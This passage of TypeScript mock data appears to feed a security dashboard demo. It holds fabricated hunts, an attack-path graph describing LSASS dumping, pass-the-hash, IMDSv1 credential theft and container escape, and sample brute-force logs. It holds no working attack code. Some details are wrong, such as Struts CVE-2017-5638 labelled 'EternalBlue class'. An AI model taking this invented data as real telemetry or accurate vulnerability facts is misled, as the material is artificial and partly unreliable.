  { id: 5, hunt_id: 7, hunt_name: 'Lateral Movement via SMB Shares', severity: 'high', confidence: 'high', risk: 'high', title: 'Admin share access sweep from SRV-01', description: 'SRV-01 accessed ADMIN$ on 6 hosts within 10 minutes', mitre_technique: 'T1021.002', affected_host: 'SRV-01', affected_user: 'svc_backup', ioc_value: '\\\\*\\ADMIN$', status: 'open', created_at: new Date(Date.now() - 10800000).toISOString() },
];

const THREAT_HUNT_CATEGORIES_DATA = {
  categories: [
    { key: 'ioc', label: 'IOC Hunts', icon: '🎯', total_count: 2, sub_categories: [{key:'ip',label:'IP Address',count:1},{key:'domain',label:'Domain',count:1},{key:'url',label:'URL',count:0},{key:'sha256',label:'SHA-256',count:0},{key:'md5',label:'MD5',count:0},{key:'email',label:'Email',count:0},{key:'ja3',label:'JA3',count:0},{key:'certificate',label:'Certificate',count:0}] },
    { key: 'ttp', label: 'TTP Hunts', icon: '⚔️', total_count: 3, sub_categories: [{key:'powershell',label:'PowerShell',count:1},{key:'persistence',label:'Persistence',count:0},{key:'injection',label:'Process Injection',count:0},{key:'lsass',label:'Credential Dumping',count:1},{key:'beaconing',label:'C2 Beaconing',count:0},{key:'lateral',label:'Lateral Movement',count:1},{key:'ransomware',label:'Ransomware',count:0}] },
    { key: 'actor', label: 'Threat Actor Hunts', icon: '🕵️', total_count: 1, sub_categories: [{key:'apt29',label:'APT29',count:1},{key:'fin7',label:'FIN7',count:0},{key:'lazarus',label:'Lazarus',count:0},{key:'scattered_spider',label:'Scattered Spider',count:0},{key:'custom',label:'Custom',count:0}] },
    { key: 'malware', label: 'Malware Hunts', icon: '🦠', total_count: 2, sub_categories: [{key:'cobalt_strike',label:'Cobalt Strike',count:1},{key:'sliver',label:'Sliver',count:0},{key:'mimikatz',label:'Mimikatz',count:0},{key:'emotet',label:'Emotet',count:0},{key:'ransomware_family',label:'Ransomware Families',count:1}] },
    { key: 'cloud', label: 'Cloud Hunts', icon: '☁️', total_count: 1, sub_categories: [{key:'aws_iam',label:'AWS IAM',count:1},{key:'azure_rbac',label:'Azure RBAC',count:0},{key:'public_storage',label:'Public Storage',count:0},{key:'k8s_privesc',label:'K8s PrivEsc',count:0}] },
    { key: 'insider', label: 'Insider Hunts', icon: '🔍', total_count: 1, sub_categories: [{key:'usb_copy',label:'USB Copy',count:0},{key:'data_exfil',label:'Data Exfiltration',count:1},{key:'source_theft',label:'Source Code Theft',count:0},{key:'privilege_abuse',label:'Privilege Abuse',count:0}] },
  ],
};

// VulnQueueItem[] built from vulnerabilities
const VULN_QUEUE_ITEMS = D.vulnerabilities.map((v: any, i: number) => {
  const ag = D.agents.find((a: any) => a.id === v.agent_id);
  return {
    id:               v.id,
    agent_id:         v.agent_id,
    hostname:         ag?.hostname ?? `Agent #${v.agent_id}`,
    cve_id:           v.cve_id   ?? `CVE-2024-${10000 + i}`,
    name:             v.name     ?? v.title ?? 'Unknown Vulnerability',
    package_name:     v.package_name ?? v.affected_component ?? 'unknown-pkg',
    package_version:  v.package_version ?? '1.0.0',
    severity:         v.severity ?? 'medium',
    cvss_score:       v.cvss_score ?? 6.5,
    epss_score:       v.epss_score ?? 0.02,
    is_kev:           v.is_kev ?? false,
    kev_ransomware:   false,
    priority_score:   v.priority_score ?? Math.floor(seededRand(v.id) * 900),
    patch_status:     v.patch_status ?? (v.fix_available ? 'open' : 'accepted_risk'),
    patch_notes:      '',
    patch_sla_days:   v.cvss_score >= 9 ? 7 : v.cvss_score >= 7 ? 30 : 90,
    patched_at:       null,
    asset_criticality: ag ? 'high' : 'medium',
  };
}).sort((a: any, b: any) => b.priority_score - a.priority_score);

// Risk posture with asset_scores
function riskPostureSnap() {
  const base = D.risk_posture[0] ?? {};

  const asset_scores = D.agents.map((a: any, i: number) => ({
    asset_id:    a.id,
    hostname:    a.hostname,
    score:       [82, 67, 44, 31][i] ?? 50,
    top_reason:  ['C2 beacon detected', 'Lateral movement', 'Vuln exposure', 'Low risk'][i] ?? 'Normal activity',
    criticality: ['critical', 'high', 'medium', 'low'][i] ?? 'medium',
    os:          a.os ?? 'linux',
  }));

  // Internet exposure — agents with non-RFC1918 IPs or known exposed flag
  const exposedHosts = D.agents
    .filter((a: any) => a.ip_address && !a.ip_address.startsWith('10.') && !a.ip_address.startsWith('192.168.') && !a.ip_address.startsWith('172.'))
    .map((a: any) => ({ hostname: a.hostname, ip: a.ip_address, port_count: 3 }));
  // Add demo internet-facing hosts
  const internet_exposure = {
    exposed_count: exposedHosts.length + 2,
    exposed_hosts: [
      { hostname: 'web-prod-01',  ip: '203.0.113.12', open_ports: [80, 443, 8080], services: ['nginx/1.18', 'Node/18'] },
      { hostname: 'vpn-gw-01',   ip: '203.0.113.5',  open_ports: [1194, 443],     services: ['OpenVPN/2.5', 'stunnel'] },
      ...exposedHosts.map((h: any) => ({ hostname: h.hostname, ip: h.ip, open_ports: [22, 443], services: ['sshd'] })),
    ],
  };

  // Missing patches — from vulnerabilities
  const vulns = D.vulnerabilities ?? [];
  const missingPatches = {
    critical: vulns.filter((v: any) => v.cvss_score >= 9.0  && !v.patched_at).length,
    high:     vulns.filter((v: any) => v.cvss_score >= 7.0  && v.cvss_score < 9.0 && !v.patched_at).length,
    medium:   vulns.filter((v: any) => v.cvss_score >= 4.0  && v.cvss_score < 7.0 && !v.patched_at).length,
    total:    vulns.filter((v: any) => !v.patched_at).length,
    overdue:  vulns.filter((v: any) => !v.patched_at && v.cvss_score >= 7.0).length,
  };

  // Unsupported OS
  const unsupported_os = [
    { hostname: 'win-workstation-05', os: 'Windows 7 SP1',    eol: '2020-01-14', agent_id: 3 },
    { hostname: 'legacy-db-03',       os: 'CentOS 6.10',      eol: '2020-11-30', agent_id: null },
    { hostname: 'print-srv-01',       os: 'Windows Server 2008 R2', eol: '2020-01-14', agent_id: null },
  ];

  // Misconfigurations — derived from alerts + demo
  const misconfigs = [
    { id: 1, title: 'SMB Signing Disabled',           severity: 'high',   asset: 'win-workstation-05', category: 'network' },
    { id: 2, title: 'RDP Exposed to Internet',         severity: 'critical',asset: 'web-prod-01',       category: 'network' },
    { id: 3, title: 'SSH Root Login Enabled',          severity: 'high',   asset: 'db-server-02',       category: 'auth' },
    { id: 4, title: 'Weak Password Policy (< 8 chars)',severity: 'medium', asset: 'AD Domain',          category: 'identity' },
    { id: 5, title: 'Admin Share (C$) Accessible',    severity: 'high',   asset: 'win-workstation-05', category: 'network' },
    { id: 6, title: 'Antivirus Definition Outdated',  severity: 'medium', asset: 'android-mobile-01',  category: 'endpoint' },
    { id: 7, title: 'Docker Socket Mounted in Container', severity: 'critical', asset: 'k8s-node-01',  category: 'container' },
  ];

  // User risk — from UEBA
  const user_risk = (D.ueba_users ?? [])
    .slice(0, 8)
    .map((u: any) => ({
      username:     u.username,
      risk_score:   u.risk_score,
      flags:        u.flags ?? [],
      failed_logins:u.failed_logins ?? 0,
      off_hours:    u.off_hours_events ?? 0,
      last_seen_ip: u.last_seen_ip ?? '—',
    }));

  // Department risk
  const department_risk = [
    { name: 'Engineering',  score: 68, users: 24, assets: 12, top_issue: 'Unpatched CVEs' },
    { name: 'Finance',      score: 45, users: 8,  assets: 6,  top_issue: 'Insider threat indicators' },
    { name: 'IT Ops',       score: 82, users: 6,  assets: 18, top_issue: 'C2 beacon on endpoint' },
    { name: 'Sales',        score: 31, users: 35, assets: 15, top_issue: 'Phishing susceptibility' },
    { name: 'HR',           score: 22, users: 12, assets: 4,  top_issue: 'Weak passwords' },
    { name: 'Executive',    score: 55, users: 5,  assets: 5,  top_issue: 'Impossible travel' },
  ];

  // High-risk identities — from ITDR findings
  const high_risk_identities = (D.itdr_findings ?? [])
    .filter((f: any) => f.status === 'open')
    .slice(0, 6)
    .map((f: any) => ({
      identity:       f.identity,
      identity_type:  f.identity_type,
      finding_type:   f.finding_type,
      severity:       f.severity,
      mitre_technique:f.mitre_technique,
      description:    f.description,
    }));

  // High-risk applications
  const high_risk_apps = [
    { name: 'TeamViewer',      version: '14.7',  risk: 'high',   reason: 'Remote access tool — abused by threat actors', assets: 2 },
    { name: 'WinRAR',          version: '5.70',  risk: 'critical',reason: 'CVE-2023-38831 unpatched (EPSS 0.97)',        assets: 3 },
    { name: 'OpenSSL',         version: '1.0.2k',risk: 'critical',reason: 'EOL — Heartbleed-era version still in use',   assets: 2 },
    { name: 'Apache Struts',   version: '2.3.34',risk: 'high',   reason: 'CVE-2017-5638 (EternalBlue class RCE)',       assets: 1 },
    { name: 'Log4j',           version: '2.14.1',risk: 'critical',reason: 'Log4Shell CVE-2021-44228 — has_kev: true',   assets: 1 },
  ];

  // Trend — 30 days, adding breakdown per score type
  const now = Date.now();
  const trend = Array.from({ length: 30 }, (_, i) => {
    const d = new Date(now - (29 - i) * 86400000);
    const base_score = 30 + Math.round(Math.sin(i * 0.4) * 12 + i * 0.5);
    return {
      date:        d.toISOString().slice(0, 10),
      score:       Math.min(95, base_score + 10),
      vuln_score:  Math.min(40, Math.round(20 + Math.sin(i * 0.3) * 8)),
      ueba_score:  Math.min(20, Math.round(8 + Math.cos(i * 0.5) * 5)),
      alert_score: Math.min(30, Math.round(15 + Math.sin(i * 0.6) * 8)),
      ioc_score:   Math.min(20, Math.round(5 + Math.cos(i * 0.4) * 4)),
    };
  });

  return {
    score:                base.score       ?? 62,
    vuln_score:           base.vuln_score  ?? 35,
    ueba_score:           base.ueba_score  ?? 60,
    alert_score:          base.alert_score ?? 55,
    ioc_score:            base.ioc_score   ?? 20,
    snoozed_alert_count:  2,
    snapshot_at:          new Date().toISOString(),
    asset_scores,
    internet_exposure,
    missing_patches:      missingPatches,
    unsupported_os,
    misconfigurations:    misconfigs,
    user_risk,
    department_risk,
    high_risk_identities,
    high_risk_apps,
    trend,
  };
}

// DFIR collections with all required fields
const DFIR_COLLECTIONS = [
  {
    id:             1,
    label:          'IR-2026-001 — C2 Beacon Investigation',
    agent_hostname: D.agents[0]?.hostname ?? 'web-prod-01',
    agent_id:       D.agents[0]?.id ?? 1,
    status:         'completed',
    triggered_by:   'analyst@xcloak.tech',
    artifact_types: ['memory', 'processes', 'network', 'files'],
    started_at:     new Date(Date.now() - 86400000 * 2).toISOString(),
    completed_at:   new Date(Date.now() - 86400000 * 2 + 3600000).toISOString(),
    created_at:     new Date(Date.now() - 86400000 * 2).toISOString(),
    artifact_count: 12,
    incident_id:    1,
    tenant_id:      9999,
  },
  {
    id:             2,
    label:          'IR-2026-002 — Ransomware Containment',
    agent_hostname: D.agents[1]?.hostname ?? 'db-server-02',
    agent_id:       D.agents[1]?.id ?? 2,
    status:         'completed',
    triggered_by:   'analyst@xcloak.tech',
    artifact_types: ['memory', 'files', 'registry'],
    started_at:     new Date(Date.now() - 86400000).toISOString(),
    completed_at:   new Date(Date.now() - 86400000 + 1800000).toISOString(),
    created_at:     new Date(Date.now() - 86400000).toISOString(),
    artifact_count: 8,
    incident_id:    2,
    tenant_id:      9999,
  },
];

// Framework compliance — FrameworkAssessment[]
const FRAMEWORK_ASSESSMENTS = (() => {
  const frameworks = [...new Set(D.compliance_scores.map((s: any) => s.framework))];
  return frameworks.map((fw: any) => {
    const scores = D.compliance_scores.filter((s: any) => s.framework === fw);
    const score  = scores[0]?.score ?? 74;
    const total  = 80;
    const covered = Math.round(total * score / 100);
    const partial = Math.round(total * 0.08);
    const gaps    = total - covered - partial;
    return {
      framework:      fw,
      overall_score:  score,
      total_controls: total,
      covered,
      partial,
      gaps:           Math.max(0, gaps),
      controls:       [],
    };
  });
})();

// Network map with correct NetworkMapNode / NetworkMapEdge / NetworkMapSummary shapes
const NETWORK_MAP = (() => {
  // Agent nodes — id must be a string
  const agentNodes = D.agents.map((a: any, i: number) => ({
    id:          String(a.id),
    type:        'agent' as const,
    agent_id:    a.id,
    hostname:    a.hostname,
    ip:          a.ip_address ?? `10.0.0.${i + 10}`,
    zone:        (['dmz', 'internal', 'internal', 'internal'] as const)[i] ?? 'internal',
    risk_score:  [82, 67, 44, 31][i] ?? 40,
    risk_level:  ['critical', 'high', 'medium', 'low'][i] ?? 'medium',
    alert_count: D.alerts.filter((al: any) => al.agent_id === a.id).length,
    is_ioc:      i === 0,
    status:      (a.status ?? 'online') as 'online' | 'offline',
  }));

  // Build external_ip nodes from unique remote addresses
  // remote_addr format is "IP:PORT" — split on last colon to handle IPv4
  const agentIpSet = new Set(D.agents.map((a: any) => a.ip_address).filter(Boolean));
  const extIpMap   = new Map<string, any>();
  D.endpoint_connections.forEach((c: any) => {
    const raw = c.remote_addr ?? '';
    const lastColon = raw.lastIndexOf(':');
    const ip  = lastColon > 0 ? raw.slice(0, lastColon) : raw;
    if (!ip || agentIpSet.has(ip) || extIpMap.has(ip)) return;
    extIpMap.set(ip, {
      id:          `ext_${ip}`,
      type:        'external_ip' as const,
      ip,
      zone:        'external' as const,
      risk_score:  20,
      risk_level:  'low',
      alert_count: 0,
      is_ioc:      false,
    });
  });
  const extNodes = Array.from(extIpMap.values()).slice(0, 20);
  const nodes    = [...agentNodes, ...extNodes];

  // Build agent-IP→id lookup so internal remote addrs map to an agent node
  const ipToNodeId = new Map<string, string>();
  agentNodes.forEach((n: any) => { if (n.ip) ipToNodeId.set(n.ip, n.id); });

  const PORT_SENSITIVITY: Record<number, 'safe' | 'neutral' | 'sensitive' | 'critical'> = {
    80: 'safe', 443: 'safe', 8080: 'neutral', 8443: 'neutral',
    22: 'sensitive', 3306: 'critical', 5432: 'critical', 3389: 'critical',
  };

  const edges = D.endpoint_connections.slice(0, 25).map((c: any) => {
    const raw      = c.remote_addr ?? '';
    const lastColon = raw.lastIndexOf(':');
    const remoteIp  = lastColon > 0 ? raw.slice(0, lastColon) : raw;
    const portStr   = lastColon > 0 ? raw.slice(lastColon + 1) : '443';
    const portNum   = parseInt(portStr) || 443;
    const targetId  = ipToNodeId.get(remoteIp) ?? `ext_${remoteIp}`;
    const isExternal = !ipToNodeId.has(remoteIp);
    return {
      source:           String(c.agent_id),
      target:           targetId,
      protocol:         (c.protocol ?? 'TCP').toUpperCase(),
      port:             portStr,
      service:          portNum === 443 ? 'HTTPS' : portNum === 80 ? 'HTTP' : portNum === 22 ? 'SSH' : portNum === 3389 ? 'RDP' : 'unknown',
      port_sensitivity: PORT_SENSITIVITY[portNum] ?? 'neutral',
      process:          c.process_name ?? 'svchost.exe',
      count:            c.connection_count ?? 1,
      last_seen:        c.created_at ?? new Date(Date.now() - 3600000).toISOString(),
      edge_type:        (isExternal ? 'external' : 'internal') as 'internal' | 'external',
    };
  });

  // Infrastructure topology nodes
  const infraNodes = [
    { id: 'infra-fw-01',  type: 'firewall'  as const, hostname: 'pf-fw-01',   ip: '10.0.0.1',  zone: 'dmz'      as const, risk_score: 25, risk_level: 'low',    alert_count: 0, is_ioc: false, status: 'online' as const, role: 'Perimeter Firewall', vlan: 'VLAN-1'  },
    { id: 'infra-rt-01',  type: 'router'    as const, hostname: 'core-rt-01', ip: '10.0.0.2',  zone: 'internal' as const, risk_score: 15, risk_level: 'low',    alert_count: 0, is_ioc: false, status: 'online' as const, role: 'Core Router',        vlan: 'VLAN-1'  },
    { id: 'infra-sw-01',  type: 'switch'    as const, hostname: 'acc-sw-01',  ip: '10.0.0.3',  zone: 'internal' as const, risk_score: 10, risk_level: 'low',    alert_count: 0, is_ioc: false, status: 'online' as const, role: 'Access Switch',      vlan: 'VLAN-10' },
    { id: 'infra-vpn-01', type: 'vpn'       as const, hostname: 'vpn-gw-01',  ip: '10.0.0.5',  zone: 'dmz'      as const, risk_score: 30, risk_level: 'medium', alert_count: 0, is_ioc: false, status: 'online' as const, role: 'VPN Gateway',        vlan: 'VLAN-1'  },
    { id: 'infra-ap-01',  type: 'wireless'  as const, hostname: 'ap-floor-1', ip: '10.0.1.1',  zone: 'internal' as const, risk_score: 20, risk_level: 'low',    alert_count: 0, is_ioc: false, status: 'online' as const, role: 'Wireless AP',        vlan: 'VLAN-20' },
    { id: 'infra-cloud',  type: 'cloud'     as const, hostname: 'aws-sg-web', ip: '52.2.3.4',  zone: 'external' as const, risk_score: 0,  risk_level: 'unknown',alert_count: 0, is_ioc: false, status: 'online' as const, role: 'AWS Security Group', vlan: ''        },
    { id: 'infra-wan',    type: 'wan'       as const, hostname: 'wan-uplink',  ip: '203.0.0.1', zone: 'external' as const, risk_score: 0,  risk_level: 'unknown',alert_count: 0, is_ioc: false, status: 'online' as const, role: 'WAN Uplink (ISP)',   vlan: ''        },
  ];

  const infraEdges = [
    { source: 'infra-wan',    target: 'infra-fw-01',                    protocol: 'TCP', port: '443', service: 'HTTPS',   port_sensitivity: 'neutral' as const, process: 'pppoe',          count: 1,  last_seen: new Date().toISOString(), edge_type: 'external' as const, port_note: '' },
    { source: 'infra-fw-01',  target: 'infra-rt-01',                    protocol: 'TCP', port: '80',  service: 'HTTP',    port_sensitivity: 'safe'    as const, process: 'pf',             count: 5,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
    { source: 'infra-fw-01',  target: 'infra-vpn-01',                   protocol: 'UDP', port: '1194',service: 'OpenVPN', port_sensitivity: 'neutral' as const, process: 'openvpn',        count: 2,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
    { source: 'infra-rt-01',  target: 'infra-sw-01',                    protocol: 'TCP', port: '179', service: 'BGP',     port_sensitivity: 'sensitive' as const, process: 'ospf',         count: 3,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
    { source: 'infra-sw-01',  target: String(agentNodes[0]?.id ?? '1'), protocol: 'TCP', port: '80',  service: 'HTTP',    port_sensitivity: 'safe'    as const, process: 'spanning-tree',  count: 8,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
    { source: 'infra-sw-01',  target: String(agentNodes[1]?.id ?? '2'), protocol: 'TCP', port: '80',  service: 'HTTP',    port_sensitivity: 'safe'    as const, process: 'spanning-tree',  count: 6,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
    { source: 'infra-cloud',  target: String(agentNodes[0]?.id ?? '1'), protocol: 'TCP', port: '443', service: 'HTTPS',   port_sensitivity: 'safe'    as const, process: 'aws-agent',      count: 4,  last_seen: new Date().toISOString(), edge_type: 'external' as const, port_note: '' },
    { source: 'infra-ap-01',  target: String(agentNodes[2]?.id ?? '3'), protocol: 'UDP', port: '53',  service: 'DNS',     port_sensitivity: 'neutral' as const, process: 'hostapd',        count: 12, last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
  ];

  const allNodes = [...nodes, ...infraNodes];
  const allEdges = [...edges, ...infraEdges];

  const onlineAgents = D.agents.filter((a: any) => a.status === 'online').length;
  const alertingIds  = new Set(D.alerts.map((al: any) => String(al.agent_id)));
  const summary = {
    total_agents:    D.agents.length,
    online_agents:   onlineAgents,
    external_ips:    extNodes.length,
    total_edges:     allEdges.length,
    ioc_hits:        0,
    alerting_nodes:  alertingIds.size,
    infra_devices:   infraNodes.length,
  };
  return { nodes: allNodes, edges: allEdges, summary, generated_at: new Date().toISOString() };
})();

// Attack path — matches AttackPathNode / AttackPathEdge / RankedAttackPath types
const ATTACK_PATH = (() => {
  const a0 = String(D.agents[0]?.id ?? '1');
  const a1 = String(D.agents[1]?.id ?? '2');
  const a2 = String(D.agents[2]?.id ?? '3');
  const a3 = String(D.agents[3]?.id ?? '4');

  const internetNode = {
    id: 'internet', type: 'internet' as const,
    risk_score: 100, risk_level: 'critical', max_epss: 0.9, has_kev: true, kev_count: 2,
    exposed: true, compromise_cost: 0, open_alert_count: 0,
    kill_chain_phase: 'reconnaissance', priv_level: 'none', blast_radius: D.agents.length + 4, is_chokepoint: false,
  };

  const agentNodes = D.agents.map((a: any, i: number) => ({
    id:               String(a.id),
    type:             'agent' as const,
    agent_id:         a.id,
    hostname:         a.hostname,
    risk_score:       [82, 67, 44, 31][i] ?? 40,
    risk_level:       ['critical', 'high', 'medium', 'low'][i] ?? 'medium',
    max_epss:         [0.85, 0.62, 0.3, 0.1][i] ?? 0.2,
    has_kev:          i < 2, kev_count: i < 2 ? 1 : 0,
    exposed:          i === 0, compromise_cost: [10, 25, 45, 80][i] ?? 50,
    open_alert_count: D.alerts.filter((al: any) => al.agent_id === a.id).length,
    kill_chain_phase: (['initial_access', 'lateral_movement', 'privilege_escalation', 'impact'] as const)[i] ?? 'lateral_movement',
    priv_level:       (['user', 'admin', 'root', 'system'] as const)[i] ?? 'user',
    blast_radius:     [6, 4, 2, 1][i] ?? 1,
    is_chokepoint:    i === 1,
  }));

  const extraNodes = [
    {
      id: 'cloud-ec2', type: 'cloud' as const,
      hostname: 'ec2-web-prod', risk_score: 55, risk_level: 'medium',
      max_epss: 0.45, has_kev: false, kev_count: 0, exposed: true, compromise_cost: 35,
      open_alert_count: 2, kill_chain_phase: 'collection', priv_level: 'user',
      blast_radius: 3, is_chokepoint: false,
    },
    {
      id: 'k8s-pod', type: 'container' as const,
      hostname: 'nginx-pod-7f2', risk_score: 70, risk_level: 'high',
      max_epss: 0.55, has_kev: true, kev_count: 1, exposed: false, compromise_cost: 20,
      open_alert_count: 1, kill_chain_phase: 'execution', priv_level: 'root',
      blast_radius: 5, is_chokepoint: true,
    },
    {
      id: 'dc-01', type: 'domain_controller' as const,
      hostname: 'DC01.corp.local', risk_score: 95, risk_level: 'critical',
      max_epss: 0.78, has_kev: true, kev_count: 3, exposed: false, compromise_cost: 5,
      open_alert_count: 4, kill_chain_phase: 'impact', priv_level: 'system',
      blast_radius: 12, is_chokepoint: true,
    },
  ];

  const nodes = [internetNode, ...agentNodes, ...extraNodes];

  const edges = [
    { source: 'internet',  target: a0,         kind: 'internet_exposure' as const, technique_id: 'T1190',     technique_name: 'Exploit Public-Facing App',        description: 'CVE-2024-1234 RCE in exposed web service (EPSS 0.85)' },
    { source: a0,          target: a1,          kind: 'lateral'           as const, technique_id: 'T1021.001', technique_name: 'Remote Desktop Protocol',           description: 'RDP pivot using harvested credentials from LSASS dump' },
    { source: a1,          target: a2,          kind: 'lateral'           as const, technique_id: 'T1570',     technique_name: 'Lateral Tool Transfer',             description: 'SMB file share exploitation for tool staging' },
    { source: a2,          target: a3,          kind: 'lateral'           as const, technique_id: 'T1021.002', technique_name: 'SMB/Windows Admin Shares',          description: 'Pass-the-hash via extracted NTLM hash' },
    { source: a0,          target: a2,          kind: 'priv_esc'          as const, technique_id: 'T1068',     technique_name: 'Exploitation for Privilege Escalation', description: 'Local kernel exploit CVE-2024-5678 — EPSS 0.85, leads to SYSTEM' },
    { source: a0,          target: 'cloud-ec2', kind: 'cloud_jump'        as const, technique_id: 'T1552.005', technique_name: 'Cloud Instance Metadata API',       description: 'IMDSv1 credential theft from EC2 instance metadata service' },
    { source: 'cloud-ec2', target: 'k8s-pod',   kind: 'container_escape'  as const, technique_id: 'T1611',     technique_name: 'Escape to Host',                    description: 'Privileged container escape via /proc/sysrq-trigger' },
    { source: a1,          target: 'dc-01',     kind: 'priv_esc'          as const, technique_id: 'T1003.001', technique_name: 'LSASS Memory Dump / DCSync',        description: 'DCSync after LSASS dump — Domain Admin credentials obtained' },
  ];

  const top_paths = [
    {
      hops: ['internet', a0, a1, 'dc-01'],
      total_cost: 15, target_hostname: 'DC01.corp.local', target_risk_level: 'critical', score: 97,
      path_type: 'priv_esc' as const,
      kill_chain_phases: ['reconnaissance', 'initial_access', 'lateral_movement', 'privilege_escalation', 'impact'],
      techniques: [
        { id: 'T1190',     name: 'Exploit Public-Facing App' },
        { id: 'T1021.001', name: 'Remote Desktop Protocol' },
        { id: 'T1003.001', name: 'LSASS Memory Dump / DCSync' },
      ],
      remediation: [
        'Patch CVE-2024-1234 on internet-facing web server — EPSS 0.85, actively exploited',
        'Enable Credential Guard on all Windows hosts to block LSASS memory dumping',
        'Restrict RDP access — enforce MFA, limit to jump hosts only',
        'Add Domain Admin accounts to Protected Users security group',
        'Enable Windows Event ID 4662 monitoring for DCSync detection',
      ],
    },
    {
      hops: ['internet', a0, 'cloud-ec2', 'k8s-pod'],
      total_cost: 30, target_hostname: 'nginx-pod-7f2', target_risk_level: 'high', score: 79,
      path_type: 'cloud' as const,
      kill_chain_phases: ['reconnaissance', 'initial_access', 'collection', 'execution'],
      techniques: [
        { id: 'T1190',     name: 'Exploit Public-Facing App' },
        { id: 'T1552.005', name: 'Cloud Instance Metadata API' },
        { id: 'T1611',     name: 'Escape to Host' },
      ],
      remediation: [
        'Enable IMDSv2 on all EC2 instances — disable IMDSv1 to block metadata credential theft',
        'Remove privileged: true from all Kubernetes pod specs',
        'Apply Kubernetes NetworkPolicy to restrict pod-to-pod communication',
        'Enable runtime threat detection (Falco / Sysdig) on all k8s nodes',
        'Audit EC2 IAM instance roles — apply least-privilege policies',
      ],
    },
    {
      hops: ['internet', a0, a1, a2, a3],
      total_cost: 10, target_hostname: D.agents[3]?.hostname ?? 'db-server-02', target_risk_level: 'low', score: 61,
      path_type: 'lateral' as const,
      kill_chain_phases: ['reconnaissance', 'initial_access', 'lateral_movement', 'lateral_movement', 'impact'],
      techniques: [
        { id: 'T1190',     name: 'Exploit Public-Facing App' },
        { id: 'T1021.001', name: 'Remote Desktop Protocol' },
        { id: 'T1570',     name: 'Lateral Tool Transfer' },
        { id: 'T1021.002', name: 'SMB/Windows Admin Shares' },
      ],
      remediation: [
        'Segment internal network — block lateral SMB/RDP traffic between workstations with firewall rules',
        'Deploy EDR with behavioral lateral movement detection across all endpoints',
        'Remove local admin rights from standard user accounts (least privilege)',
        'Enable SMB signing on all hosts to prevent pass-the-hash attacks',
      ],
    },
  ];

  return { nodes, edges, top_paths, has_entry_point: true };
})();

// Fake MDM devices (mdm_devices table is empty in seed data)
const MDM_DEVICES = [
  {
    id: 1, tenant_id: 9999,
    device_name: 'iPhone-CEO', serial: 'F2LX8Q3MNPQ1',
    platform: 'ios', os_version: '17.4.1', model: 'iPhone 15 Pro',
    enrollment_status: 'enrolled', compliance_status: 'compliant',
    last_checkin: new Date(Date.now() - 3600000).toISOString(),
    owner_email: 'ceo@xcloak.tech', owner_name: 'John Smith',
    is_supervised: true, is_encrypted: true, is_jailbroken: false,
    mdm_profile_installed: true, passcode_compliant: true,
    storage_used_gb: 45, storage_total_gb: 256,
    battery_level: 82, created_at: '2026-01-15T10:00:00Z',
  },
  {
    id: 2, tenant_id: 9999,
    device_name: 'android-mobile-01', serial: 'R3CX9S4KPQT2',
    platform: 'android', os_version: '14.0', model: 'Pixel 8 Pro',
    enrollment_status: 'enrolled', compliance_status: 'non_compliant',
    last_checkin: new Date(Date.now() - 7200000).toISOString(),
    owner_email: 'analyst@xcloak.tech', owner_name: 'Jane Doe',
    is_supervised: false, is_encrypted: true, is_jailbroken: false,
    mdm_profile_installed: true, passcode_compliant: false,
    storage_used_gb: 28, storage_total_gb: 128,
    battery_level: 61, created_at: '2026-02-01T08:30:00Z',
  },
  {
    id: 3, tenant_id: 9999,
    device_name: 'MacBook-SOC', serial: 'C02XN5QXJHD3',
    platform: 'macos', os_version: '14.4.1', model: 'MacBook Pro 16',
    enrollment_status: 'enrolled', compliance_status: 'compliant',
    last_checkin: new Date(Date.now() - 1800000).toISOString(),
    owner_email: 'soc@xcloak.tech', owner_name: 'SOC Analyst',
    is_supervised: true, is_encrypted: true, is_jailbroken: false,
    mdm_profile_installed: true, passcode_compliant: true,
    storage_used_gb: 120, storage_total_gb: 512,
    battery_level: 95, created_at: '2026-01-20T09:00:00Z',
  },
];

// ── Rich search log dataset (used by /logs/search + /logs/stats) ─────────────

const DEMO_SEARCH_LOGS = (() => {
  const now = Date.now();
  const ts  = (hoursAgo: number) => new Date(now - hoursAgo * 3600000).toISOString();
  const pf  = (obj: Record<string, string>) => JSON.stringify(obj);
  let id    = 5000;
  const rows: any[] = [];

  const add = (agId: number, src: string, msg: string, fields: Record<string, string>, hAgo: number) =>
    rows.push({ id: id++, agent_id: agId, log_source: src, log_message: msg, parsed_fields: pf(fields), collected_at: ts(hAgo) });

  // SSH auth failures (brute-force from external IP)
  const USERS = ['root','jdoe','admin','ubuntu','svc_web','svc_deploy','Administrator','xcsupport','soc_admin','postgres'];
  for (let i = 0; i < 22; i++) {
    const user = USERS[i % USERS.length];
    add(1, 'sshd', `Failed password for ${user} from 185.220.101.35 port ${40000+i} ssh2`,
      { auth_result: 'failure', auth_method: 'password', user, src_ip: '185.220.101.35', src_port: String(40000+i), format: 'syslog' }, i * 0.08 + 1);
  }

  // SSH successes (internal)
  add(1,'sshd','Accepted publickey for ubuntu from 10.10.1.100 port 52341 ssh2',{ auth_result:'success',auth_method:'publickey',user:'ubuntu',src_ip:'10.10.1.100',format:'syslog' },4.5);
  add(2,'sshd','Accepted password for svc_deploy from 10.10.5.100 port 55210 ssh2',{ auth_result:'success',auth_method:'password',user:'svc_deploy',src_ip:'10.10.5.100',format:'syslog' },3.2);
  add(3,'sshd','Accepted publickey for jdoe from 10.10.1.50 port 48201 ssh2',{ auth_result:'success',auth_method:'publickey',user:'jdoe',src_ip:'10.10.1.50',format:'syslog' },2.1);
  add(1,'sshd','Disconnected from authenticating user root 185.220.101.35 port 47210 [preauth]',{ auth_result:'failure',user:'root',src_ip:'185.220.101.35',format:'syslog' },0.9);

  // Windows Security Events
  for (let i = 0; i < 14; i++) {
    add(1,'WinEvent/Security',`EventCode=4625 Logon failure. Account: Administrator Source: 185.220.101.35 Attempt #${i+1}`,
      { event_id:'4625',target_user:'Administrator',src_ip:'185.220.101.35',auth_result:'failure',format:'winevent' }, i * 0.04 + 0.5);
  }
  add(1,'WinEvent/Security','EventCode=4624 Logon success. Account: jdoe Type: 3 Source: 10.10.1.50',{ event_id:'4624',target_user:'jdoe',src_ip:'10.10.1.50',logon_type:'3',auth_result:'success',format:'winevent' },6);
